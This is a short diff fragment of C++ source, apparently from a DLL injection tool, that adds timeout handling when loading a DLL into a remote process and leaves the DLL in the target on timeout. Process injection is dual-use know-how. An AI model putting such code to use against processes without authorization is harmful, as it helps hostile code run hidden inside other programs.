+    LOADER_RET ret = ExecuteDllLoader(hProcess, exec, lpRemoteLoaderEntry, NULL, yoloMode, debug);
+    if (ret == LOADER_RET::failed) {
         printf("[!] Injector: %s failed to load '%s' into remote process %i\n", GetExecutorTypeStr(exec).c_str(), dllPath.c_str(), GetProcessId(hProcess));
         return HandleCleanup(hProcess, { pRemoteTargetBase }, fileBuffer);
+    }
+    if (ret == LOADER_RET::timeout) {
+        printf("[=] Injector: %s did not load '%s' into remote process %i (yet)\n", GetExecutorTypeStr(exec).c_str(), dllPath.c_str(), GetProcessId(hProcess));
+        HandleCleanup(hProcess, { }, fileBuffer); // must leave dll in remote proc
+        return true;
     }
     printf("[*] Injector: %s loaded '%s' into remote process %i\n", GetExecutorTypeStr(exec).c_str(), dllPath.c_str(), GetProcessId(hProcess));
     HandleCleanup(hProcess, { }, fileBuffer); // do not free the dll mem if successful
